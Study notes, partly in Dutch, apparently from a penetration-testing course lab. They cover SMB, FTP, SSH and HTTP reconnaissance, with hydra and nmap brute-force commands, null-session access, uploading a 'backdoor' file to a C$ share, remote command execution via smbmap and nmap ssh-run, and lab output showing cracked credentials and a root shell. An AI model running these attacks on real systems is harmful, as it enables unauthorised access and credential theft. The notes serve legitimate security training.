

##### Servers & services 

**Server**:  it services something to a user, provides some sort of functionality that can be utilized by other devices. 
- We pull resources from servers (e.g. email/files). 
- Server can be running windows, linux, macOS. every computer can be a server 
- servers need to be accessed remotely 

**Services**: program on a computer that does a specific function) running on a server: 
- require a listening port on the server and accepting connections remotely. 
- open the barrier and allow access to program remotely 
- problem: misconfigure or bugs that can give remote access to whole system 


*Examples of services that you would see on a server* 

#### SMB (445)
- Windows file share implementation 
- CIFS (generic version) works the same as SMB 
- NetBIOS sets up session for smb 
  
SMB recon: 
-  Run an nmap scan for open ports: `nmap -T4 ip/cidr --open `
   Nmap ‘`--open`’ option would show only exposed ports of the live hosts
- Run scan for service enumeration on our OS: `nmap ip -sV -O` `nmap {target ip} -sV -sC`  
- `net use` in powershell for smb ![[Pasted image 20230509105010.png]]

SMB Discover and Mount: 
mount the SMB share of the target machine using the Windows File Explorer as well as using the command prompt

##### SMB: Nmap scripts

- nmap has an scripting engine (see documentation of nmap): `--script {scriptname}`

1. ping target ip to check connection  
2.  run an nmap scan:  `nmap {target ip}`
3. check if it has smb (port 445 is open)
4. run an nmap scan just on the smb port 445 where we look at the smb protocol: `*nmap -p445 --script smb-protocols {target ip}*`
5. run an nmap scan just on smb port 445 where we check the security mode:` *nmap -p445 --script smb-security-mode {target ip}*`
6. run an nmap scan where we enumerate a session: `*nmap -p445 --script smb-enum-sessions {target ip}*`
7. run the following nmap: `*nmap -p445 --script smb-enum-sessions --script-args* *smbusername={adminstrator}, smbpassword={smbserver_771} {target ip}*`
	 - `script-args`: geeft argumenten door aan het smb-enum-sessions script, die specifiek zijn voor dat script. 
	   
8. run the following nmap command to enumerate the shares: `*nmap -p445 --script smb-enum-shares {target ip}* `
	- gebruikt om de gedeelde bronnen te identificeren die beschikbaar zijn op een bepaalde host die SMB gebruikt op poort 445. SMB is een protocol dat wordt gebruikt voor het delen van bestanden en printers tussen computers op een netwerk.![[Pasted image 20230510145104.png]]
	- `ipc$ `is usefull because it is a ***null session*** (anonymous session) where you can get in as a **guest** account but also utilize this session: Het kan worden gebruikt door geautoriseerde gebruikers om verbinding te maken met het bestandssysteem en printers van de computer via het netwerk, zonder dat ze een geldige inlognaam of wachtwoord nodig hebben. 
	  
9. Now run a command where we enumerate the shares after authenticating: `*nmap -p445  --script smb-enum-shares --script-args smbusername=administrator, smbpaswordsmbserver_771 {target ip}*`
   
10. now enumerate the users to find out which users exist: `*nmap -p445 --script smb-enum-users --script-args smbusername=administrator smbpasword=smbserver_771 {target ip}*`  
     (bult in accounts for guests en password does not expire = misconfiguration). De gastaccount,. biedt beperkte toegang tot bepaalde bronnen, zoals bestanden en printers, en heeft geen wachtwoord nodig om toegang te krijgen
     
 11. run a command to look at server statistic: `*nmap -p445 --script smb-server-stats --script-arg smbusersname=administrator, smbpassword=smbserver_771 {target ip}*
     `
 13. run command to check what domains exist: `*nmap -p445 -script smb-enum-domains -s-cript-args smbusername=administrator, smbpassword=smbserver_771 {target ip}`*
     
 14. run command to check groups: `nmap -p445 --script smb-enum-groups --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}* `
     
 15. run command to check what services are running: 
     ``nmap -p445 --script smb-enum-services   --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}``

 16. run command to see what shares exist but also enumerate those shares: `*nmap -p445 --script smb-enum-shares,smb-ls      --script-arg smbusername=adminsitrator, smbpassword=smbserver_771 {ip}*  ` 
	 - `smb-enum-shares`: This script will enumerate all the SMB shares on the target system.
	-  `smb-ls`: This script will run the `ls` command on each share. Note that the `smb-ls` script requires authentication credentials for the target system. You can provide the credentials using the `smbusername` and `smbpassword` script arguments. For example:

##### SMBMap 

1. ping 
2.  `nmap {target ip}`
3. `nmap -p445 --script smb-protocols {targetip}`  this will tell us the procols and dialects. When we spot dialect SMBv1 which is dangerous we will use smbmap
4. `smbmap -u guest -p "" -d . -H {target ip} `
	- -   `-u guest`: gebruikt de gebruikersnaam "guest" om verbinding te maken met de host.
	-   `-p ""`: stelt het wachtwoord in op een lege string, wat betekent dat er geen wachtwoord wordt gebruikt om verbinding te maken met de host.
	-   `-d .`: stelt de domeinnaam in op "." (de huidige domeinnaam).
	-   `-H {target ip}`: specificeert het IP-adres van de doel-SMB-host waarmee verbinding moet worden gemaakt.

5.  `smbmap -H {taget ip} -u administrator -p smbserver_771 -x 'ipconfig'`
6. `*smbmap -H {taget ip} -u administrator -p 'smbserver_771' -L *`
7. if there is a `C$` : `smbmap -H {taget ip} -u Administrator -p 'smbserver_771' -r 'C$'`
	  
8. Lets try the following: 
	1. create a file `touch backdoor `
	2.  `smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor' `
	3. `*smbmap -H {taget ip} -u Administrator -p 'smbserver_771' -r 'C$'*`
		 - If sucessfull then that means that you can upload a file. 
	4. download a file: `*smbmap -H {taget ip} -u Administrator -p 'smbserver_771' --download 'C$\{filename.extention}'* `
	5.  `cat filename`

   
####  SMB: Samba 1 

-  `nmap`  
-  udp scan with `--top-port 25 --open` 
-  service enumeration on open udp ports 
- `nmap {target ip} -p 445 --script smb-os-discovery `

	*msfconsole*
		- `use auxiliary/scanner/smb/smb_version `
	
- `nmblookup -A {target IP} `
   `nmblookup`- wordt gebruikt om NetBIOS-naamservers te bevragen om informatie te verkrijgen over NetBIOS-namen en hun bijbehorende IP-adressen. Door de optie `-A` te gebruiken,  voert het commando een omgekeerde zoekopdracht uit om de NetBIOS-naam op te halen die is gekoppeld aan dat IP-adres.  

We see <20> that means we can try to connect to this for this we use: smbclient. 

- `smbclient -h ` 
- `smbclient -L {targetip} -N  `
	-   `-N`: Deze optie schakelt de authenticatie uit

 *IPC$* with a *null* session: A null session refers to an unauthenticated connection or session established between a client and a server without providing any credentials

- `rcpclient -h `
- `rpcclient -U "" -N {target ip}`
	- `rpcclient`: Dit is de opdracht om een RPC-clientprogramma te starten
	-   `-U ""`: Deze optie geeft aan dat je een lege gebruikersnaam ("") gebruikt om verbinding te maken. Hiermee wordt een null session geïnitieerd, wat betekent dat er geen expliciete gebruikersnaam wordt verstrekt voor authenticatie.
	-   `-N`: Deze optie schakelt de authenticatie uit, waardoor er geen wachtwoord nodig is om verbinding te maken met de RPC-service.


Stappenplan: 

-    `nmap {targetip}`
-    `nmap -sV {targetip}`
-   `nmap -sU --top-ports 25 --open targetip``
-   `nmap -sU -sV --top-ports 25 --open targetip``
-   `nmap -p 445 --script smb-os-discovery targetip``
exploit in msfconsole 
-   `nmblookup -A targetip} .
-    `smbclient -L {targetip} -N` 
-    `rpcclient -U "" -N targetip' 


#####  SMB: Samba 2

- `nmap`
-  `rpcclient -U "" -N {Target ip}`
- `enum4linux -o {target ip}`
-  ` smbclient -L {target IP} `
-  `nmap {target} -p 445 --script smb-protocols``
- `msfconsole` -->  `use auxiliary/scanner/smb/smb2 
-  `nmap {ip} -p 445 --script smb-enum-users `
-  `enum4linux -U {target} `  
-  `rpcclient -U "" -N {Target ip} `
	- `enumdomusers` 
	 - `lookupnames amin `


#### SMB 3 

-  `nmap {target ip} -p 445 --script smb-enum-shares `
-  `use auxiliary/scanner/smb/smb_enumshares `
-  `enum4linux -S {ip} `
- `smbclient -L {target} -N`   (-N = nullsession)
- `enum4linux -G {target} `
- `rpcclient -U "" -N {target}`
	- `enumdomgroups`
-  `smbclient //target/Public -N `


#### SMB Dictonary Attack 
- wordlist = list of passwords e.g. rocky 
- Enumerate smb share: 
	- msfconsole 
	- use auxiliary/scanner/smb/smb_login 
	
- `gzip -d /usr/share/wordlists/rockyou.txt.gz `
		
- `*hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz  {target} smb*`
- `*smbmap -H {target} -u admin -p password1* `
- ` ***smbclient -L {target} -U jane  (password is 123abc)***`
-  `smbclient //target/jane -U jane `
- `smbclient //target/admin -U admin `
![[Pasted image 20230516103627.png]]
- ` exit smb > ls > use tar -xf flag.tar.gz `
- enumerate pipes: 
	- `msfconsole `
	- `use auxiliary/scanner/smb/pipe_auditor `
	
- `**enum4linux -r -u "admin" -p "password1" {target}** `
	

stappenplan 

1.  Enumerate SMB shares:
    -    `msfconsole`
		 `use auxiliary/scanner/smb/smb_login``
	    Set the password file with: `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
    -   Set the SMB username with: `set smbuser {jane}`
    -   Run: `options` to confirm the settings
2.  Decompress the wordlist:
    -   Run: `gzip -d /usr/share/wordlists/rockyou.txt.gz`
3.  Perform a password attack using Hydra:
    -   Run: `hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} smb`
4.  Check if any shares are browsable:
    -   Run: `smbclient -L {target} -U jane -p 123abc`
5.  Explore the 'jane' share:
    -   Run: `smbclient //target/jane -U jane`
    -   Run: `ls` to list the files in the share
6.  Explore the 'admin' share:
    -   Run: `smbclient //target/admin -U admin`
    -   After authenticating, the prompt will change to `smb: \>`
    -   Run: `ls` to list the files in the share
7.  Extract a compressed file:
    -   Get the desired file using `smbclient`
    -   Exit the `smbclient` prompt
    -   Run: `ls` to verify the file is present
    -   Run: `tar -xf flag.tar.gz` to extract the compressed archive
8.  Enumerate named pipes:
    -   Open a terminal and run: `msfconsole`
    -   Inside the Metasploit console, run: `use auxiliary/scanner/smb/pipe_auditor`
    -   Set the SMB username with: `set smbuser admin`
    -   Set the SMB password with: `set smbpass password1`
    -   Set the target host with: `set rhost {target}`
    -   Run: `options` to view and verify the options
    -   Finally, run the module with: `run`
9.  Get a list of SIDs:
    -   Run: `enum4linux -r -u "admin" -p "password1" {target}`


---- 

####  FTP 

- nmap  
-  `nmap {target} -p 21 -sV -0`
- `hydra -L /usr/share/metasploit-framework/data/wordlist/common_users.txt -P /usr.share.metasploit-framework/data/wordlist/unix_passwords.txt {target ip} {service}` 
- `ftp {ip}`  (use credentials from the results from the hydra scan)
- `get` 

	  

- echo "sysadmin" > users 
- cat users 
Andere om ftp te bruteforcen strategy: 
- run folllowing command **nmap ip --script ftp-brute --script-args usersb=/root/users -p 21** 
	- -   `--script ftp-brute`: This option specifies that the FTP-brute script should be executed. The FTP-brute script is used to perform brute-force attacks against FTP services.
	-   `--script-args usersb=/root/users`: This option specifies the location of the username wordlist file to be used during the brute-force attack. In this case, the file is located at `/root/users`. Modify the path to the actual location of your username wordlist file.
	-   `-p 21`: This option specifies that only port 21 (FTP) should be scanned. The `-p` option followed by the port number restricts the scan to that specific port. In this case, port 21 is being scanned.


----- LAB ----- 

target ip: 192.70.37.3 


**Questions**

1.  What is the version of FTP server?
   
		   root@attackdefense:~# nmap 192.70.37.3 
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 13:08 UTC
		Nmap scan report for target-1 (192.70.37.3)
		Host is up (0.000010s latency).
		Not shown: 999 closed ports
		PORT   STATE SERVICE
		21/tcp open  ftp    📍
		MAC Address: 02:42:C0:46:25:03 (Unknown)


		root@attackdefense:~# nmap 192.70.37.3 -p 21 -sV -O
	
		PORT   STATE SERVICE VERSION
		21/tcp open  ftp     ProFTPD 1.3.5a 📍
		MAC Address: 02:42:C0:46:25:03 (Unknown)
		Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
		Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
		No exact OS matches for host (test conditions non-ideal).
		Network Distance: 1 hop
		Service Info: OS: Unix

or nmap -sV 

   
2.  Use the username dictionary /usr/share/metasploit framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
   
		   root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.70.37.3 ftp
		Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
		
		Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-16 13:31:20
		[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
		[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
		[DATA] attacking ftp://192.70.37.3:21/
		[21][ftp] host: 192.70.37.3   login: sysadmin   password: 654321
		[21][ftp] host: 192.70.37.3   login: rooty   password: qwerty
		[21][ftp] host: 192.70.37.3   login: demo   password: butterfly
		[21][ftp] host: 192.70.37.3   login: auditor   password: chocolate
		[21][ftp] host: 192.70.37.3   login: anon   password: purple
		[21][ftp] host: 192.70.37.3   login: administrator   password: tweety
		[21][ftp] host: 192.70.37.3   login: diag   password: tigger
		   



3.  Find the password of user “sysadmin” using nmap script.
   
   
**nmap ip --script ftp-brute --script-args usersb=/root/users -p 21** 

	root@attackdefense:~# echo 'sysadmin' > users 
	root@attackdefense:~# cat users 
	sysadmin
	

	root@attackdefense:~# nmap 192.70.37.3 --script ftp-brute --script-args userdb=/root/users -p 21 
	Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 13:38 UTC
	Nmap scan report for target-1 (192.70.37.3)
	Host is up (0.000054s latency).
	
	PORT   STATE SERVICE
	21/tcp open  ftp
	| ftp-brute: 
	|   Accounts: 
	|     sysadmin:654321 - Valid credentials
	|_  Statistics: Performed 24 guesses in 5 seconds, average tps: 4.8
	MAC Address: 02:42:C0:46:25:03 (Unknown)
	   
4.  Find seven flags hidden on the server.

260ca9dd8a4577fc00b7bd5810298076   - login: sysadmin   password: 654321 
098f6bcd4621d373cade4e832627b4f6  -  login: auditor   password: chocolate

----

#### FTP Anonymous login 

- check open ports with nmap 
- do service scan on open port 
- run following command: nmap ip  -p 21 --script ftp-anon 
	- `--script ftp-anon`: This option instructs Nmap to execute the "ftp-anon" script. The "ftp-anon" script is used to check if anonymous (unauthenticated) FTP access is allowed on the target system. 
	- If anonymous login is possible then login with username: anonymous and no password 


LAB -- 

1.  Find the version of vsftpd server.
   
		   root@attackdefense:~# nmap 192.97.20.3 -sV
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 14:02 UTC
		Nmap scan report for target-1 (192.97.20.3)
		Host is up (0.0000090s latency).
		Not shown: 999 closed ports
		PORT   STATE SERVICE VERSION
		21/tcp open  ftp     vsftpd 3.0.3
		MAC Address: 02:42:C0:61:14:03 (Unknown)
		Service Info: OS: Unix


   
2.  Check whether anonymous login is allowed on the ftp server using nmap script.
   
		   root@attackdefense:~# nmap 192.97.20.3 -p21 --script ftp-anon
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-16 14:03 UTC
		Nmap scan report for target-1 (192.97.20.3)
		Host is up (0.000040s latency).
		
		PORT   STATE SERVICE
		21/tcp open  ftp
		| ftp-anon: Anonymous FTP login allowed (FTP code 230)
		| -rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
		|_drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
		MAC Address: 02:42:C0:61:14:03 (Unknown)
   
   
   
   
3.  Fetch the flag from FTP server. 

![[Pasted image 20230516160454.png]]


### SSH

- Secure shell -> communicate with remote machine over protected channel 
- Stappenplan: 

1. Nmap scan on target ip 
2. Do service scan (get operating system info) on port 22: nmap ip -sV -O 
3. run: ssh root@ip and try to login with maybe abc123 
4. if permission denied try using netcat: nc ip port  (nc ip 22 ) this will give you the banner which is usefull for enumeration 
5. run: **nmap ip -p 22 --script ssh2-enum-algos** 
	 - The script is designed to enumerate and display the supported encryption algorithms, key exchange algorithms, and message authentication codes (MACs) supported by the SSH server running on the target host. It helps in identifying the security configuration of the SSH service.
	 - By running this command, you can gather information about the SSH encryption algorithms supported by the target host. This can be useful for assessing the security posture of SSH services and ensuring that strong encryption algorithms are being used.
	 - 
6. run: **nmap ip -p 22 --script ssh-hostkey --script-args ssh_hostkey=full** 
	- `--script ssh-hostkey`: This option tells Nmap to use the `ssh-hostkey` script as part of the scan. The `ssh-hostkey` script is a built-in script in Nmap that retrieves and displays the SSH host key information for the target host.
	- It specifies the `full` option, which indicates that detailed information about the SSH host key should be retrieved.
7. check if there are any weak paswords for ssh:  **nmap ip -p 22 --script ssh-auth-methods --script-args="ssh.user=student"** 
	- -   `--script ssh-auth-methods`: Dit geeft aan dat de Nmap-scripts met betrekking tot SSH-authenticatiemethoden moeten worden uitgevoerd. Deze scripts zullen proberen de ondersteunde authenticatiemethoden te identificeren die beschikbaar zijn op de SSH-server.
	-   `--script-args="ssh.user=student"`: Dit is een scriptargument dat wordt doorgegeven aan de Nmap-scripts. In dit geval wordt de argumentwaarde "student" gebruikt om aan te geven dat de scan moet worden uitgevoerd alsof de gebruiker "student" is. Dit kan nuttig zijn als de SSH-server verschillende authenticatiemethoden aanbiedt op basis van de gebruiker. met deze opdracht wordt een Nmap-scan uitgevoerd om de SSH-authenticatiemethoden te identificeren die beschikbaar zijn op het opgegeven doel-IP-adres, waarbij de scan wordt uitgevoerd alsof de gebruiker "student" is.
	- if the result is none than is dangerous 
8. check if there are any weak paswords for ssh for admin:  **nmap ip -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"** 

Since the student did not require any authentication we try: ssh student@ip > who am i > ipconfig > cat FLAG > logout 
![[Pasted image 20230517150117.png]]

---- LAB --- 

target ip: 192.60.141.3

sudo nmap -A -Pn 192.60.141.3

1.  What is the version of SSH server.
   
		   root@attackdefense:~#  nmap 192.60.141.3 -sV -O
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:06 UTC
		Nmap scan report for target-1 (192.60.141.3)
		Host is up (0.000039s latency).
		Not shown: 999 closed ports
		PORT   STATE SERVICE VERSION
		22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) 📍
		MAC Address: 02:42:C0:3C:8D:03 (Unknown)
		No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

   
   
   
   
2.  Fetch the banner using netcat and check the version of SSH server.
	   
		   root@attackdefense:~# nc 192.60.141.3 22  
			SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6
   
   
   
3.  Fetch pre-login SSH banner.
   
			   root@attackdefense:~# ssh root@192.60.141.3 
		The authenticity of host '192.60.141.3 (192.60.141.3)' can't be established.
		ECDSA key fingerprint is SHA256:dxlBXgBb0Iv5/LmemZ2Eikb5+GLl9CSLf/B854fUeV8.
		Are you sure you want to continue connecting (yes/no)? yes
		Warning: Permanently added '192.60.141.3' (ECDSA) to the list of known hosts.
		Welcome to attack defense ssh recon lab!!
		root@192.60.141.3's password: 
		Permission denied, please try again.
			   
   
   
   
4.  How many “encryption_algorithms” are supported by the SSH server. 27 
   
		   root@attackdefense:~# nmap 192.60.141.3 -p 22 --script ssh2-enum-algos
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:11 UTC
		Nmap scan report for target-1 (192.60.141.3)
		Host is up (0.000030s latency).
		
		PORT   STATE SERVICE
		22/tcp open  ssh
		| ssh2-enum-algos: 
		|   kex_algorithms: (6)
		|       curve25519-sha256@libssh.org
		|       ecdh-sha2-nistp256
		|       ecdh-sha2-nistp384
		|       ecdh-sha2-nistp521
		|       diffie-hellman-group-exchange-sha256
		|       diffie-hellman-group14-sha1
		|   server_host_key_algorithms: (5)
		|       ssh-rsa
		|       rsa-sha2-512
		|       rsa-sha2-256
		|       ecdsa-sha2-nistp256
		|       ssh-ed25519
		|   encryption_algorithms: (6)
		|       chacha20-poly1305@openssh.com
		|       aes128-ctr
		|       aes192-ctr
		|       aes256-ctr
		|       aes128-gcm@openssh.com
		|       aes256-gcm@openssh.com
		|   mac_algorithms: (10)
		|       umac-64-etm@openssh.com
		|       umac-128-etm@openssh.com
		|       hmac-sha2-256-etm@openssh.com
		|       hmac-sha2-512-etm@openssh.com
		|       hmac-sha1-etm@openssh.com
		|       umac-64@openssh.com
		|       umac-128@openssh.com
		|       hmac-sha2-256
		|       hmac-sha2-512
		|       hmac-sha1
		|   compression_algorithms: (2)
		|       none
		|_      zlib@openssh.com
		MAC Address: 02:42:C0:3C:8D:03 (Unknown)
		   
   
   
5.  What is the ssh-rsa host key being used by the SSH server.
   
		root@attackdefense:~# nmap 192.60.141.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:13 UTC
		Nmap scan report for target-1 (192.60.141.3)
		Host is up (0.000045s latency).
		
		PORT   STATE SERVICE
		22/tcp open  ssh
		| ssh-hostkey: 
		|   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1fkJK7F8yxf3vewEcLYHljBnKTAiRqzFxkFo6lqyew73ATL2Abyh6at/oOmBSlPI90rtAMA6jQGJ+0HlHgf7mkjz5+CBo9j2VPu1bejYtcxpqpHcL5Bp12wgey1zup74fgd+yOzILjtgbnDOw1+HSkXqN79d+4BnK0QF6T9YnkHvBhZyjzIDmjonDy92yVBAIoB6Rdp0w7nzFz3aN9gzB5MW/nSmgc4qp7R6xtzGaqZKp1H3W3McZO3RELjGzvHOdRkAKL7n2kyVAraSUrR0Oo5m5e/sXrITYi9y0X6p2PTUfYiYvgkv/3xUF+5YDDA33AJvv8BblnRcRRZ74BxaD

   
   
6.  Which authentication method is being used by the SSH server for user “student”.
   
		   
		root@attackdefense:~# nmap 192.60.141.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"  
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:15 UTC
		Nmap scan report for target-1 (192.60.141.3)
		Host is up (0.000035s latency).
		
		PORT   STATE SERVICE
		22/tcp open  ssh
		| ssh-auth-methods: 
		|_  Supported authentication methods: none_auth
		MAC Address: 02:42:C0:3C:8D:03 (Unknown)
   
   
7.  Which authentication method is being used by the SSH server for user “admin”.
   
   
		root@attackdefense:~# nmap 192.60.141.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"  
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 14:15 UTC
		Nmap scan report for target-1 (192.60.141.3)
		Host is up (0.000044s latency).
		
		PORT   STATE SERVICE
		22/tcp open  ssh
		| ssh-auth-methods: 
		|   Supported authentication methods: 
		|     publickey
		|_    password
		MAC Address: 02:42:C0:3C:8D:03 (Unknown)
		
		Nmap done: 1 IP address (1 host up) scanned in 2.37 seconds
   
   
8.  Fetch the flag from /home/student/FLAG by using nmap ssh-run script.

![[Pasted image 20230517161808.png]] 

or 

nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password=" ip 
-  `--script=ssh-run`: This option specifies that the "ssh-run" script should be executed as part of the Nmap scan. The "ssh-run" script is a pre-defined script in Nmap that allows running custom commands on an SSH server.
-   `--script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password="`: This argument provides the arguments or parameters to the "ssh-run" script. It consists of three key-value pairs:
    -   `ssh-run.cmd=cat /home/student/FLAG`: This specifies the command to be executed on the SSH server. In this case, the command is `cat /home/student/FLAG`, which will read the contents of the "/home/student/FLAG" file on the remote SSH server.
    -   `ssh-run.username=student`: This sets the SSH username to "student". It specifies the username that will be used to authenticate with the SSH server during the scan.
    -   `ssh-run.password="`: This leaves the SSH password field empty. It means that no password is provided for authentication, and the script will attempt to connect to the SSH server using other authentication methods like public keys or other configured methods.


![[Pasted image 20230517162726.png]]


###  SSH Dictonary attack 

- nmap ip 
- nmap ip -sV -p 22 
- lets use the following wordlist: gzip -d /urs/share/wordlist/rockyou.txt.gz   
- use hydra for the wordlist: **hydra -l student -P /usr/share/wordlist/rockyou.txt ip ssh** 
- ssh student@ip (use password found with above command)
- lets check for admin: 
	- echo "adminsitrator" > user
		- e`cho "adminsitrator" > user`: This command creates a file named "user" and writes the string "administrator"  into it. This file will be used as a user database for the SSH brute force attack.
	- **nmap ip -p 22 --script ssh-brute --script-args userdb=/root/user** 
		- -   `--script ssh-brute`: It instructs Nmap to use the "ssh-brute" script, which is designed to perform a brute force attack against SSH servers.
		-   `--script-args userdb=/root/user`: This option provides the script argument "userdb" with the value "/root/user". It tells the "ssh-brute" script to use the specified file ("/root/user") as the user database for the brute force attack. The file should contain a list of usernames or user passwords that will be used during the attack.
- lets try the root password: 
	- msfconsole 
	- use auxiliary/scanner/ssh/ssh_login 
	- show options  ---> fix options ![[Pasted image 20230517165449.png]]
	- ssh root@ip 
	- fill in password found with metasploit 


--- Lab ---- 

target ip: 192.66.209.3 
		
		root@attackdefense:~# nmap 192.66.209.3 -sV -p 22
		PORT   STATE SERVICE VERSION
		22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6  
	

1.  Find the password of user “student” using hydra.
   
   
		root@attackdefense:~# hydra -l student -P /usr/share/wordlists/rockyou.txt 192.66.209.3 ssh
		[STATUS] 182.00 tries/min, 182 tries in 00:01h, 14344223 to do in 1313:35h, 16 active
		[22][ssh] host: 192.66.209.3   login: student   password: friend 📍
		1 of 1 target successfully completed, 1 valid password found
		   
   
2.  Find the password of user “administrator” use appropriate Nmap scripts with password dictionary: /usr/share/nmap/nselib/data/passwords.lst
   
	**root@attackdefense:~# nmap -p 22 --script ssh-brute --script-args userdb=/root/user, passdb=/usr/share/nmap/nselib/data/passwords.lst 192.66.209.3** 
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 15:36 UTC
		Unable to split netmask from target expression: "passdb=/usr/share/nmap/nselib/data/passwords.lst"
		NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
		Nmap scan report for target-1 (192.66.209.3)
		Host is up (0.000049s latency).
		
		PORT   STATE SERVICE
		22/tcp open  ssh
		| ssh-brute: 
		|   Accounts: 
		|     administrator:sunshine - Valid credentials
		|_  Statistics: Performed 27 guesses in 5 seconds, average tps: 5.4
		MAC Address: 02:42:C0:42:D1:03 (Unknown)
		
		Nmap done: 1 IP address (1 host up) scanned in 5.38 seconds
		root@attackdefense:~# 


OF 

		root@attackdefense:~# nmap -p 22 --script ssh-brute --script-args userdb=/root/user  192.66.209.3   
		Starting Nmap 7.70 ( https://nmap.org ) at 2023-05-17 15:44 UTC
		NSE: [ssh-brute] Trying username/password pair: administrator:administrator
		NSE: [ssh-brute] Trying username/password pair: administrator:
		NSE: [ssh-brute] Trying username/password pair: administrator:michelle
		NSE: [ssh-brute] Trying username/password pair: administrator:tigger
		NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
		NSE: [ssh-brute] Trying username/password pair: administrator:chocolate
		Nmap scan report for target-1 (192.66.209.3)
		Host is up (0.000039s latency).
		
		PORT   STATE SERVICE
		22/tcp open  ssh
		| ssh-brute: 
		|   Accounts: 
		|     administrator:sunshine - Valid credentials
		|_  Statistics: Performed 28 guesses in 5 seconds, average tps: 5.6
		MAC Address: 02:42:C0:42:D1:03 (Unknown)


   
3.  Find the password of user “root” using ssh_login Metasploit module with userpass dictionary: /usr/share/wordlists/metasploit/root_userpass.txt
   
		   msf5 auxiliary(scanner/ssh/ssh_login) > run
		
		[-] 192.66.209.3:22 - Failed: 'root:'
		[!] No active DB -- Credential data will not be saved!
		[-] 192.66.209.3:22 - Failed: 'root:!root'
		[-] 192.66.209.3:22 - Failed: 'root:Cisco'
		[-] 192.66.209.3:22 - Failed: 'root:NeXT'
		[-] 192.66.209.3:22 - Failed: 'root:QNX'
		[-] 192.66.209.3:22 - Failed: 'root:admin'
		[+] 192.66.209.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-131-generic #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
		[*] Command shell session 1 opened (192.66.209.2:44957 -> 192.66.209.3:22) at 2023-05-17 15:40:38 +0000
		[*] Scanned 1 of 1 hosts (100% complete)
		[*] Auxiliary module execution completed


   ![[Pasted image 20230517174720.png]]
   
4.  What is the message of the day? (Printed after the user logs in to the SSH server).

	
		root@attackdefense:~# ssh root@192.66.209.3
		Ubuntu 16.04.5 LTS
		root@192.66.209.3's password: 
		Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 5.4.0-131-generic x86_64)
		
		 * Documentation:  https://help.ubuntu.com
		 * Management:     https://landscape.canonical.com
		 * Support:        https://ubuntu.com/advantage
		SSH recon dictionary attack lab

---


### HTTP 

- hosting website 
- run standard nmap 
- run extra nmap: nmap -sV -O 
	- when port 80 is open we check in our webbrowser is we can connect to the website 
- run: whatweb targetip 
	- By executing "whatweb targetip," you are instructing the tool to scan the specified IP address and provide information about the technologies, frameworks, content management systems (CMS), server software, and other relevant details associated with the target web server 
- run hhtpie: http target ip 
- run: dirb http://ip 
	- dirb will look for directories - first it will ook at toplevel directories then it will  go to subfolders 
- run: browsh --startup-url http:// 
  ![[Pasted image 20230606133353.png]]
  this will try to render the website if you do not have a browser 

-- Lab --- 
Nmap scan report for 10.2.24.249
Host is up (0.0025s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE       VERSION
**80/tcp   open  http          Microsoft IIS httpd 10.0**
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services

root@attackdefense:~# whatweb 10.2.24.249
